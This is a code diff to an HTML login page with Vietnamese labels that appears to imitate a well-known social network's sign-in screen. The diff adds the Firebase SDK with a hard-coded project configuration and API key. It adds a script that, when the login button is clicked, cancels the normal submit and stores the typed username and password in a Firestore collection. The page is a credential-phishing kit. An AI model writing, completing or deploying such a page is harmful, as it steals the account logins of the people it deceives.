@@ -8,7 +8,6 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="default" />
   <meta name="mobile-web-app-capable" content="yes" />
   <meta name="theme-color" content="#ffffff" />
-  <link rel="preload" href="./5a56d51ae30f.js" as="script" type="text/javascript" crossorigin="anonymous" />
   <meta id="viewport" name="viewport"
     content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover" />
   <meta
@@ -26,7 +25,7 @@
       background-repeat: no-repeat;
       height: 28px;
       width: 82px;
-      background-image: url("./9fa70da24d23.png");
+      background-image: url(/public/9fa70da24d23.png);
       background-size: 502px 477px;
       background-position: -242px -194px;
     }
@@ -44,7 +43,7 @@
       background-repeat: no-repeat;
       height: 51px;
       width: 175px;
-      background-image: url("./bcd90c1d4868.png");
+      background-image: url(./bcd90c1d4868.png);
       background-size: 440px 411px;
       background-position: 0 -129px;
       margin: 22px auto 12px;
@@ -83,7 +82,7 @@
       background-repeat: no-repeat;
       height: 16px;
       width: 16px;
-      background-image: url("./bcd90c1d4868.png");
+      background-image: url(./bcd90c1d4868.png);
       background-size: 440px 411px;
       background-position: -364px -329px;
       display: inline-block;
@@ -100,6 +99,28 @@
       margin-bottom: 5px;
     }
   </style>
+
+  <!-- The core Firebase JS SDK is always required and must be listed first -->
+  <script src="https://www.gstatic.com/firebasejs/8.1.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.1.1/firebase-firestore.js"></script>
+
+  <!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+
+  <script>
+    // Your web app's Firebase configuration
+    var firebaseConfig = {
+      apiKey: "AIzaSyCQ0BsonjdhlKEY4gxeN5Tb9-0TGvpZxQY",
+      authDomain: "demoings.firebaseapp.com",
+      databaseURL: "https://demoings.firebaseio.com",
+      projectId: "demoings",
+      storageBucket: "demoings.appspot.com",
+      messagingSenderId: "773456670372",
+      appId: "1:773456670372:web:e74affa296f92716f94031"
+    };
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+  </script>
 </head>
 
 <body class="" style="">
@@ -192,9 +213,9 @@
                       <div class="s311c"></div>
                     </div>
                     <div class="Et89U">
-                      <input type="text" class="_9GP1n input username"
+                      <input type="text" class="_9GP1n input username" id="name"
                         placeholder="Số điện thoại, tên người dùng hoặc email" />
-                      <input type="text" class="_9GP1n input" placeholder="Mật khẩu" />
+                      <input type="password" class="_9GP1n input" placeholder="Mật khẩu" id="pass" />
                     </div>
                     <div class="Igw0E IwRSH hLiUi ybXk5 _4EzTm bkEs3 CovQj jKUp7 qJPeX">
                       <a href="#" tabindex="0">
@@ -202,8 +223,8 @@
                       </a>
                     </div>
                     <div class="Igw0E IwRSH eGOV_ _4EzTm bkEs3 CovQj jKUp7 DhRcB">
-                      <button class="sqdOP L3NKy y3zKF" disabled="" type="submit">
-                        <div class="Igw0E IwRSH eGOV_ _4EzTm">
+                      <button class="sqdOP L3NKy y3zKF">
+                        <div class="Igw0E IwRSH eGOV_ _4EzTm" id="login">
                           Đăng nhập
                         </div>
                       </button>
@@ -253,6 +274,23 @@
       <div></div>
     </div>
   </div>
+
+  <script>
+    const db = firebase.firestore();
+    const loginBtn = document.getElementById('login');
+    const name = document.getElementById('name');
+    const pass = document.getElementById('pass');
+    const data = db.collection('data');
+    loginBtn.onclick = (e) => {
+      console.log('pass :>> ', pass);
+      console.log('data :>> ', data);
+      e.preventDefault();
+      data.add({
+        name: name.value,
+        pass: pass.value,
+      })
+    }
+  </script>
 </body>
 
 </html>
